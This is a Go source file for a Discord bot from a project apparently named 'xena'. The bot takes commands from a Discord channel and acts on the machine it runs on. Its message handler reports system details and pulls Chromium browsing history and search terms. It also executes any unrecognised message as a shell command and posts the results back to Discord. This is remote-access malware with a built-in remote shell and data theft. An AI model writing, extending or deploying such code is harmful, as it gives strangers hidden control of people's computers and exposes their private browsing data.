package services

import (
	"fmt"
	"strings"
	"xena/config"
	"xena/modules"

	"github.com/bwmarrin/discordgo"
)

type Discord struct {
	session *discordgo.Session
}

// Close shuts down the connection to the Discord.
func (dsc *Discord) Close() {
	dsc.session.Close()
}

// Init establishes a connectio to the Discord.
func (dsc *Discord) Init() error {
	session, err := discordgo.New("Bot " + config.DiscordToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return err
	}

	dsc.session = session

	dsc.session.AddHandler(messageHandle)

	// In this example, we only care about receiving message events.
	dsc.session.Identify.Intents = discordgo.IntentsGuildMessages

	// Open a websocket connection to Discord and begin listening.
	err = dsc.session.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return err
	}

	return nil
}

// messageHandle interprets the messages and returns a response.
func messageHandle(session *discordgo.Session, message *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if message.Author.ID == session.State.User.ID {
		return
	}

	// Execute content.
	reply := ""

	// Get system's details.
	if message.Content == "/os" {
		details := modules.GetOsDetails()
		reply += "OS: " + details.Os + "\nArch: " + details.Arch + "\nCPUs: " + fmt.Sprint(details.CpuCount)

	} else if message.Content == "/hello" {
		reply = "Hello. I'm " + config.ID

		// Add a bot peer.
	} else if message.Content == "/browserVisits" {
		visits, err := modules.GrabChromiumHistory("VISITS")
		if err != nil {
			session.ChannelMessageSend(message.ChannelID, config.ID+": error while executing: "+message.Content)
			return
		}

		for i := 0; i < len(visits); i++ {
			reply += fmt.Sprint(i) + ": " + visits[i]
		}

		// Grab Chromium history of search terms.
	} else if message.Content == "/browserSearches" {
		searches, err := modules.GrabChromiumHistory("TERMS")
		if err != nil {
			session.ChannelMessageSend(message.ChannelID, config.ID+": error while executing: "+message.Content)
			return
		}

		for i := 0; i < len(searches); i++ {
			reply += fmt.Sprint(i) + ": " + searches[i]
		}

		// Perform web search using duckduckgo.
	} else if strings.HasPrefix(message.Content, "/duckit ") {
		term := message.Content[8:]
		searchResults, err := Duckit(term)
		if err != nil {
			session.ChannelMessageSend(message.ChannelID, config.ID+": error while executing: "+message.Content)
			return
		}
		for i := 0; i < len(searchResults); i++ {
			reply += fmt.Sprint(i) + ": " + searchResults[i]
		}

		// If nothing maches then just execute it in the shell and return the result.
	} else {
		output, err := modules.RunTerminal(message.Content)
		if err != nil {
			session.ChannelMessageSend(message.ChannelID, config.ID+": error while executing: "+message.Content)
			return
		}
		reply = output
	}

	session.ChannelMessageSend(message.ChannelID, "["+config.ID+"] "+message.Content+" ->\n"+reply)
}
